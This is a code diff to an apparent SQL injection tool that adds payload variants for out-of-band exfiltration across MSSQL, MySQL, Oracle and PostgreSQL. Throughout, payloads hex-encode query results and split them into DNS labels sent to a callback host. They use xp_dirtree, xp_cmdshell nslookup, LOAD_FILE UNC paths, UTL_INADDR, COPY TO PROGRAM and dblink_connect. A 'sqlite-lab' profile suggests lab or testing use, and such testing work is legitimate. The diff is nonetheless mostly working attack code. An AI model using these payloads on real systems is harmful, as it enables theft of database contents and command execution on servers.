@@ -62,7 +62,7 @@ class Profile:
             )
             if self.name == "mssql-cmdshell":
                 return f"{base}'; EXEC master..xp_cmdshell 'nslookup '+{split}+'.{host}'/*"
-            return f"{base}'; EXEC master..xp_dirtree '//'+{split}+'.{host}/x'/*"
+            return f"{base}'; DECLARE @o NVARCHAR(MAX); SET @o='\\\\'+{split}+'.{host}\\x'; EXEC master..xp_dirtree @o-- -"
 
         if self.name == "postgres-dblink":
             # PostgreSQL: encode()::hex, split with substring + CASE
@@ -123,6 +123,55 @@ class Profile:
 
         return None
 
+    def direct_payloads(self, base: str, expression: str, prefix: str, domain: str) -> list[str]:
+        payload = self.direct_payload(base, expression, prefix, domain)
+        if payload is None:
+            return []
+
+        host = f"{prefix}.{domain}"
+        if self.name == "mssql":
+            h = f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expression})),2)"
+            split = (
+                f"SUBSTRING({h},1,62)"
+                f"+CASE WHEN LEN({h})>62 THEN '.'+SUBSTRING({h},63,62) ELSE '' END"
+                f"+CASE WHEN LEN({h})>124 THEN '.'+SUBSTRING({h},125,62) ELSE '' END"
+                f"+CASE WHEN LEN({h})>186 THEN '.'+SUBSTRING({h},187,62) ELSE '' END"
+            )
+            variants = [
+                payload,
+                f"{base}'; DECLARE @o NVARCHAR(MAX); SET @o='\\\\'+{split}+'.{host}\\x'; EXEC master..xp_fileexist @o-- -",
+                f"{base}'; DECLARE @o NVARCHAR(MAX); SET @o='\\\\'+{split}+'.{host}\\x'; EXEC master..xp_subdirs @o-- -",
+            ]
+            return list(dict.fromkeys(variants))
+
+        if self.name == "oracle-http":
+            h = f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))"
+            split = (
+                f"SUBSTR({h},1,62)"
+                f"||CASE WHEN LENGTH({h})>62 THEN '.'||SUBSTR({h},63,62) ELSE '' END"
+                f"||CASE WHEN LENGTH({h})>124 THEN '.'||SUBSTR({h},125,62) ELSE '' END"
+                f"||CASE WHEN LENGTH({h})>186 THEN '.'||SUBSTR({h},187,62) ELSE '' END"
+            )
+            return list(dict.fromkeys([
+                payload,
+                f"{base}'||(SELECT UTL_INADDR.GET_HOST_ADDRESS({split}||'.{host}') FROM dual)||'",
+            ]))
+
+        if self.name == "postgres-program":
+            esc = host.replace("'", "'\"'\"'")
+            h = f"encode(({expression})::bytea,'hex')"
+            split = (
+                f"substring({h},1,62)"
+                f"||CASE WHEN length({h})>62 THEN '.'||substring({h},63,62) ELSE '' END"
+                f"||CASE WHEN length({h})>124 THEN '.'||substring({h},125,62) ELSE '' END"
+                f"||CASE WHEN length({h})>186 THEN '.'||substring({h},187,62) ELSE '' END"
+            )
+            return list(dict.fromkeys([
+                payload,
+            ]))
+
+        return [payload]
+
     def payload(self, base: str, condition: str, callback_host: str) -> str:
         if self.name == "sqlite-lab":
             return (
@@ -132,7 +181,7 @@ class Profile:
         if self.name == "mssql":
             return (
                 f"{base}';IF ({condition}) "
-                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'/*"
+                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'-- -"
             )
         if self.name == "mysql":
             return (
@@ -174,6 +223,70 @@ class Profile:
                 f"THEN http_get('http://{callback_host}/') ELSE 0 END--"
             )
         raise ValueError(f"unknown profile: {self.name}")
+
+    def payloads(self, base: str, condition: str, callback_host: str) -> list[str]:
+        if self.name == "mssql":
+            variants = []
+            for proc in ("xp_dirtree", "xp_fileexist", "xp_subdirs"):
+                variants.extend([
+                    f"{base}';IF ({condition}) EXEC master..{proc} '\\\\{callback_host}\\x'-- -",
+                    f"{base}';IF ({condition}) EXEC master..{proc} '\\\\{callback_host}\\x'/*",
+                ])
+            return list(dict.fromkeys(variants))
+
+        if self.name == "mssql-cmdshell":
+            return list(dict.fromkeys([
+                f"{base}';IF ({condition}) EXEC master..xp_cmdshell 'nslookup {callback_host}'-- -",
+                f"{base}';IF ({condition}) EXEC master..xp_cmdshell 'nslookup {callback_host}'/*",
+            ]))
+
+        if self.name == "mysql":
+            return list(dict.fromkeys([
+                self.payload(base, condition, callback_host),
+                (
+                    f"{base}' AND IF({condition},"
+                    f"LOAD_FILE('\\\\\\\\{callback_host}\\\\x'),0)#"
+                ),
+                (
+                    f"{base}' AND IF({condition},"
+                    f"LOAD_FILE(CONCAT('\\\\\\\\','{callback_host}','\\\\x')),0)-- -"
+                ),
+            ]))
+
+        if self.name == "mysql-stacked":
+            escaped = callback_host.replace("'", "''")
+            return list(dict.fromkeys([
+                self.payload(base, condition, callback_host),
+                f"{base}'; SELECT IF({condition},LOAD_FILE('\\\\\\\\{escaped}\\\\x'),NULL)#",
+            ]))
+
+        if self.name == "oracle-http":
+            return list(dict.fromkeys([
+                self.payload(base, condition, callback_host),
+                (
+                    f"{base}'||(SELECT CASE WHEN {condition} "
+                    f"THEN UTL_INADDR.GET_HOST_ADDRESS('{callback_host}') ELSE '' END FROM dual)||'"
+                ),
+            ]))
+
+        if self.name == "postgres-program":
+            escaped = callback_host.replace("'", "'\"'\"'")
+            return list(dict.fromkeys([
+                self.payload(base, condition, callback_host),
+                f"{base}';COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'--",
+            ]))
+
+        if self.name == "postgres-dblink":
+            return list(dict.fromkeys([
+                self.payload(base, condition, callback_host),
+                (
+                    f"{base}';SELECT dblink_connect('oob', 'host={callback_host} "
+                    "user=a password=a dbname=a') WHERE "
+                    f"{condition}--"
+                ),
+            ]))
+
+        return [self.payload(base, condition, callback_host)]
 
 
 PROFILES = {
